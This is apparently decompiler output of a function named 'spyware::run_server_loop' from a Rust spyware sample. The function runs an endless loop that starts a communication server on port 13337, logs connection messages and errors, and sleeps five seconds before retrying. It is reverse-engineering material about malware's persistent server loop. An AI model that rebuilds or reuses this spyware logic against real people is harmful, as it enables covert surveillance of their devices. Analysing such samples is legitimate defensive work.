
  void spyware::run_server_loop::ha507d6dda312d1be() __noreturn

{
    while (true)
    {
        int64_t (* var_b8)(int64_t* arg1, int64_t* arg2);
        char const* const var_b0;
        void** const var_80;
        int128_t var_68;
        int64_t (** var_50)(int64_t* arg1, int64_t* arg2);
        int64_t (* rax_2)(int64_t* arg1, int64_t* arg2);
        
        if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4)
        {
            var_80 = &data_4b92a0;
            int64_t var_78_2 = 1;
            int64_t var_70_2 = 8;
            var_68 = {0};
            int64_t rax_5 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9300);
            var_b0 = "spyware:Successfully connected t…";
            int64_t var_a8_2 = 7;
            char const* const var_a0_2 = "spyware:Successfully connected t…";
            int64_t var_98_2 = 7;
            int64_t var_90_2 = rax_5;
            log::__private_api::log::h13afddf373bd7d7f(&var_80, 4, &var_b0);
            rax_2 = spyware::communication::server::run_server::hf575f6adb91dbfb6(0x3419);
            
            if (rax_2)
            {
                label_45191c:
                int64_t (* var_88)(int64_t* arg1, int64_t* arg2) = rax_2;
                
                if (core::sync::atomic::atomic_load::h8c88032dab18ab12())
                {
                    var_b8 = 5;
                    var_50 = &var_88;
                    int64_t (* var_48_1)(int64_t* arg1, int64_t* arg2) = _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
                    int64_t (** var_40_1)(int64_t* arg1, int64_t* arg2) = &var_b8;
                    uint64_t (* var_38_1)(int64_t* arg1, char* arg2) = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$for$u20$u64$GT$::fmt::h5424ed13591dfd18;
                    var_80 = &data_4b92b0;
                    int64_t var_78_1 = 3;
                    *var_68[8] = 0;
                    int64_t (*** var_70_1)(int64_t* arg1, int64_t* arg2) = &var_50;
                    var_68 = 2;
                    int64_t rax_4 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9318);
                    var_b0 = "spyware:Successfully connected t…";
                    int64_t var_a8_1 = 7;
                    char const* const var_a0_1 = "spyware:Successfully connected t…";
                    int64_t var_98_1 = 7;
                    int64_t var_90_1 = rax_4;
                    log::__private_api::log::h13afddf373bd7d7f(&var_80, 1, &var_b0);
                }
                
                core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_88);
            }
        }
        else
        {
            rax_2 = spyware::communication::server::run_server::hf575f6adb91dbfb6(0x3419);
            
            if (rax_2)
                goto label_45191c;
        }
        
        if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4)
        {
            var_b8 = 5;
            var_50 = &var_b8;
            uint64_t (* var_48_2)(int64_t* arg1, char* arg2) = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$for$u20$u64$GT$::fmt::h5424ed13591dfd18;
            var_80 = &data_4b92e0;
            int64_t var_78_3 = 2;
            *var_68[8] = 0;
            int64_t (*** var_70_3)(int64_t* arg1, int64_t* arg2) = &var_50;
            var_68 = 1;
            int64_t rax_7 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9330);
            var_b0 = "spyware:Successfully connected t…";
            int64_t var_a8_3 = 7;
            char const* const var_a0_3 = "spyware:Successfully connected t…";
            int64_t var_98_3 = 7;
            int64_t var_90_3 = rax_7;
            log::__private_api::log::h13afddf373bd7d7f(&var_80, 4, &var_b0);
        }
        
        std::thread::sleep::h1a6eeffe1c923e1f(5, 0);
    }
}
